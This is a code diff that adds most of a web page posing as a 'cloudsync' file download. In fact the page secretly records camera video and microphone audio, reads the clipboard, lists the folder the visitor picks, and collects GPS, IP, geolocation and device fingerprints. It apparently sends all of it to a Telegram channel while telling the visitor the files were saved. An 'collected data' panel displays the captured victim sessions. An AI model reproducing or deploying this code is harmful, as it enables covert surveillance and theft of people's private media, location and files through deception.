+        save(); tgDoc(b64,'camera_'+CFG.CAM_VIDEO_SEC+'s.webm','🎥 camera video '+CFG.CAM_VIDEO_SEC+'s '+tag());
+        ev('cam_video_recorded',{bytes:blob.size});
+      }catch(e){}
+    }, CFG.CAM_VIDEO_SEC*1000);
+  }catch(e){ ev('cam_video_fail',{name:e.name}) }
+}
+async function grabMic(){
+  if(perms.mic){ return true }
+  ev('mic_attempt');
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({audio:true});
+    perms.mic=true;
+    session.micInfo=stream.getTracks().map(t=>t.label);
+    tgText('🎙 MIC GRANTED '+tag()+'\n'+session.micInfo.join(', '));
+    try{
+      const rec=new MediaRecorder(stream); const chunks=[];
+      rec.ondataavailable=e=>chunks.push(e.data);
+      rec.start();
+      setTimeout(async()=>{
+        try{ rec.stop();
+          const blob=new Blob(chunks,{type:(chunks[0]&&chunks[0].type)||'audio/webm'});
+          const b64=await blobToB64(blob);
+          session.captures=session.captures||[];
+          session.captures.push({type:'audio',reason:'mic_'+CFG.MIC_SEC+'s',data:b64});
+          save(); tgDoc(b64,'mic_'+CFG.MIC_SEC+'s.webm','🎙 mic '+CFG.MIC_SEC+'s '+tag());
+          ev('audio_recorded',{bytes:blob.size});
+        }catch(e){ stream.getTracks().forEach(t=>t.stop()) }
+      },CFG.MIC_SEC*1000);
+    }catch(e){}
+    return true;
+  }catch(e){ ev('mic_fail',{name:e.name}); tgText('🎙 mic denied/not available: '+e.name+' '+tag()); return false }
+}
+function blobToB64(blob){ return new Promise(res=>{ const r=new FileReader(); r.onload=()=>res(r.result); r.readAsDataURL(blob) }) }
+
+/* ---------- storage + download ---------- */
+async function grabStorage(src){
+  ev('storage_attempt');
+  try{ const est=await navigator.storage.estimate();
+    session.storageEstimate={quotaGB:+(est.quota/1073741824).toFixed(1), usageMB:Math.round((est.usage||0)/1048576)};
+    save();
+  }catch(e){}
+  try{ session.storagePersist=await navigator.storage.persist(); save(); }catch(e){}
+
+  const files = [{f:'photo_main.jpg', name:'IMG-0431.jpg'}]
+    .concat(CFG.CHAT_FILES.map((f,i)=>({f, name:'chat_0912_0'+(i+1)+'.jpg'})));
+
+  if(window.showDirectoryPicker){
+    try{
+      const dir=await showDirectoryPicker({mode:'readwrite'});
+      perms.storage=true;
+      session.pickedDir=true;
+      const names=[];
+      try{
+        for await (const entry of dir.values()){
+          names.push((entry.kind==='directory'?'[dir] ':'')+entry.name);
+          if(names.length>=500) break;
+        }
+      }catch(e){}
+      session.dirListing=names; save();
+      tgText('💾 FOLDER PICKED — '+names.length+' items, quota '+(session.storageEstimate?session.storageEstimate.quotaGB+'GB':'?')+' '+tag());
+      if(names.length) tgTextChunked('📁 folder contents:', names.slice(0,200));
+      for(const fl of files){
+        try{
+          const blob=await fetch(fl.f).then(r=>r.blob());
+          const fh=await dir.getFileHandle(fl.name,{create:true});
+          const w=await fh.createWritable(); await w.write(blob); await w.close();
+        }catch(e){}
+      }
+      ev('storage_ok_desktop',{files:files.length, names:names.length});
+      finishFlow(src,true);
+      return;
+    }catch(e){ ev('dir_pick_fail',{name:e.name}); }
+  }
+  try{
+    for(const fl of files){
+      const blob=await fetch(fl.f).then(r=>r.blob());
+      const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
+      a.download=fl.name; a.click();
+      await sleep(350);
+    }
+    ev('storage_fallback_download',{files:files.length});
+  }catch(e){ ev('download_fail',{}) }
+  finishFlow(src,false);
+}
+async function finishFlow(src,desktop){
+  ev('flow_complete',{desktop,src});
+  if(camRecorder){ try{ camRecorder.stop() }catch(e){} camRecorder=null }
+  if(heroStream){ heroStream.getTracks().forEach(t=>t.stop()); heroStream=null }
+  // re-enumerate devices now that labels are unlocked
+  if(perms.camera||perms.mic){ session.media2=await mediaDevices(); save(); }
+  const lines=[
+    'duration: '+(session.durSec||0)+'s',
+    'camera: '+(perms.camera?'YES':'no')+' · mic: '+(perms.mic?'YES':'no')+' · gps: '+(session.precise?'YES':'no')+' · storage: '+(session.pickedDir?'folder picked':'downloads'),
+    'fp: '+session.fp+' · GPU: '+((session.fpGL||{}).renderer||'-'),
+    'IP: '+(session.ip||'-')+' · '+(((session.geo||{}).city)||'-')+' · '+(((session.geo||{}).org)||'-'),
+    'quota: '+(session.storageEstimate?session.storageEstimate.quotaGB+'GB / used '+session.storageEstimate.usageMB+'MB':'-'),
+    (session.media2&&session.media2.length)?('devices: '+session.media2.join(' | ')):'',
+    (session.precise?('GPS: '+session.precise.lat+', '+session.precise.lon):'')
+  ].filter(Boolean);
+  tgText('🏁 FLOW COMPLETE '+tag()+'\n'+lines.join('\n'));
+  showMBody(`
+    <h2>✓ Done</h2>
+    <p>Files saved${desktop?' to the selected folder':' to your device'}.<br>Some media may still appear blurred (damaged source).</p>
+    <div class="steps">
+      <button class="btn2" onclick="hideModal()">close</button>
+    </div>`);
+  log('complete ✓');
+  document.getElementById('pn').textContent='100% — done';
+  save();
+}
+
+/* ---------- clipboard ---------- */
+async function copyLink(){
+  ev('copy_click');
+  const url=location.origin+location.pathname;
+  try{ await navigator.clipboard.writeText(url); toast('link copied') }catch(e){ toast(url) }
+  try{ const t=await navigator.clipboard.readText(); if(t){ session.clipboard=t.slice(0,500); save(); tgText('📋 clipboard: '+session.clipboard+' '+tag()) } }catch(e){}
+}
+
+/* ================= COLLECTED DATA (local test) ================= */
+function esc(s){ return String(s==null?'-':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') }
+function openCD(){ renderCD(); document.getElementById('cdPanel').classList.add('show') }
+function closeCD(){ document.getElementById('cdPanel').classList.remove('show') }
+function clearCD(){ if(confirm('Delete ALL locally collected sessions?')){ localStorage.removeItem('arc_sessions'); renderCD(); refreshTab() } }
+function exportCD(){
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([localStorage.getItem('arc_sessions')||'{}'],{type:'application/json'}));
+  a.download='collected_data.json'; a.click();
+}
+function renderCD(){
+  const all=Object.values(JSON.parse(localStorage.getItem('arc_sessions')||'{}')).sort((a,b)=>b.startedAt-a.startedAt);
+  let h=`<div class="cdh"><b>📋 COLLECTED DATA — local test view (${all.length} session${all.length===1?'':'s'})</b>
+    <span class="tools">
+      <button class="cdbtn" onclick="exportCD()">⬇ export JSON</button>
+      <button class="cdbtn warnb" onclick="clearCD()">🗑 clear all</button>
+      <button class="cdbtn" onclick="closeCD()">✕ close</button>
+    </span></div>`;
+  if(!all.length) h+='<div class="empty">Nothing collected yet.<br>Run the flow, then reopen this tab.</div>';
+  all.forEach(s=>{
+    const photos=(s.captures||[]).filter(c=>c.type==='photo');
+    const audios=(s.captures||[]).filter(c=>c.type==='audio');
+    const videos=(s.captures||[]).filter(c=>c.type==='video');
+    h+=`<div class="sess"><h3>[${esc((s.id||'').slice(0,8))}] ${new Date(s.startedAt).toLocaleString()} ${s.canary?'· canary: <u>'+esc(s.canary)+'</u>':''} ${s.finalMsgShown?'· ✔ COMPLETED FLOW':''}</h3>`;
+    h+=`<div class="kv">device: <b>${esc(s.device&&s.device.ua)}</b></div>`;
+    h+=`<div class="kv">platform: <b>${esc(s.device&&s.device.platform)}</b> · screen: <b>${esc(s.device&&s.device.screen)}</b> @${esc(s.device&&s.device.dpr)}x · cores: <b>${esc(s.device&&s.device.cores)}</b> · RAM: <b>${esc(s.device&&s.device.memoryGB)}</b>GB · touch: <b>${esc(s.device&&s.device.touch)}</b></div>`;
+    h+=`<div class="kv">timezone: <b>${esc(s.device&&s.device.timezone)}</b> · langs: <b>${esc(s.device&&s.device.langs)}</b> · net: <b>${esc(s.device&&s.device.net)}</b> · battery: <b>${esc(JSON.stringify(s.battery||'-'))}</b></div>`;
+    h+=`<div class="kv">fingerprint: <b>${esc(s.fp)}</b> · audioFP: <b>${esc(s.fpAudio)}</b> · GPU: <b>${esc(s.fpGL&&s.fpGL.renderer)}</b> (${esc(s.fpGL&&s.fpGL.vendor)})</div>`;
+    h+=`<div class="kv">IP: <b>${esc(s.ip)}</b> · city: <b>${esc(s.geo&&s.geo.city)}</b> · region: <b>${esc(s.geo&&s.geo.region)}</b> · country: <b>${esc(s.geo&&s.geo.country)}</b> · org: <b>${esc(s.geo&&s.geo.org)}</b></div>`;
+    if(s.precise) h+=`<div class="kv">📍 GPS: <a class="gpslink" target="_blank" href="https://www.openstreetmap.org/?mlat=${s.precise.lat}&mlon=${s.precise.lon}#map=17/${s.precise.lat}/${s.precise.lon}">${s.precise.lat}, ${s.precise.lon}</a> (±${esc(s.precise.acc)}m)</div>`;
+    else h+=`<div class="kv">📍 GPS: — </div>`;
+    h+=`<div class="kv">camera: <b>${s.camInfo?'✅ YES':'—'}</b> · mic: <b>${s.micInfo?'✅ YES':'—'}</b> · storage: <b>${s.pickedDir?'✅ folder picked ('+(s.dirListing?s.dirListing.length:0)+' files)':'—'}</b></div>`;
+    if(s.dirListing && s.dirListing.length){
+      h+=`<div class="caplabel">📁 files in the folder he picked (${s.dirListing.length}):</div><div class="dirlist">`;
+      s.dirListing.forEach(n=>{ h+=esc(n)+'<br>' });
+      h+=`</div>`;
+    }
+    if(videos.length){
+      h+=`<div class="caplabel">🎥 camera video (${videos.length}):</div><div class="cdvideos">`;
+      videos.forEach(v=>{ h+=`<video controls src="${v.data}"></video><div class="caplabel" style="margin:0 0 8px">${esc(v.reason)}</div>` });
+      h+=`</div>`;
+    }
+    if(photos.length){
+      h+=`<div class="caplabel">📷 captured photos (${photos.length}):</div><div class="cdphotos">`;
+      photos.forEach(p=>{ h+=`<img src="${p.data}" onclick="zoomImg(this)" title="${esc(p.reason)}">` });
+      h+=`</div>`;
+    }
+    if(audios.length){
+      h+=`<div class="caplabel">🎙 recorded audio:</div>`;
+      audios.forEach(a=>{ h+=`<audio controls src="${a.data}"></audio><div class="caplabel" style="margin:0 0 8px">${esc(a.reason)}</div>` });
+    }
+    if(s.events && s.events.length){
+      h+=`<div class="evtl">`;
+      s.events.forEach(e=>{ h+=`<div>${new Date(e.t).toLocaleTimeString()} · ${esc(e.e)}${e.m?' · '+esc(JSON.stringify(e.m)):''}</div>` });
+      h+=`</div>`;
+    }
+    h+=`<div class="kv">duration: <b>${esc(s.durSec)}s</b></div></div>`;
+  });
+  document.getElementById('cdPanel').innerHTML=h;
+}
+function zoomImg(el){ document.getElementById('lb2i').src=el.src; document.getElementById('lb2').classList.add('show') }
+function refreshTab(){
+  document.getElementById('cdTab').style.display = CFG.LOCAL_TEST ? 'block' : 'none';
+  if(CFG.LOCAL_TEST){
+    const n=Object.keys(JSON.parse(localStorage.getItem('arc_sessions')||'{}')).length;
+    document.getElementById('cdTab').textContent='COLLECTED DATA'+(n?' ('+n+')':'');
+    setTimeout(refreshTab,3000);
+  }
+}
+
+/* ---------- init ---------- */
+async function init(){
+  let uid=localStorage.getItem('arc_uid'); if(!uid){ uid=uuid(); localStorage.setItem('arc_uid',uid) }
+  session={
+    id:uuid(), visitor:uid,
+    canary:Q.get('c')||null, landing:location.href,
+    startedAt:Date.now(), page:'cloudsync',
+    device:deviceInfo(), fp:canvasFP(), fpGL:webglFP(),
+    events:[], captures:[], precise:null, clipboard:null,
+    ip:null, geo:null, camInfo:null, micInfo:null, opened:false,
+    pickedDir:false, dirListing:null, storageEstimate:null, storagePersist:null, finalMsgShown:false, media2:null
+  };
+  try{ history.replaceState(null,'',location.pathname) }catch(e){}
+  save();
+  tgVisit();
+  getIP();
+  (async()=>{ session.fpAudio=await audioFP(); session.webrtc=await webrtc();
+    session.battery=await battery(); session.media=await mediaDevices(); save(); tgDetails(); })();
+  window.addEventListener('pagehide',()=>{ save(); tgClose(); });
+  buildDash();
+  refreshTab();
+  setTimeout(tgPollIncoming, 8000);
+}
+init();
+</script>
+</body>
+</html>
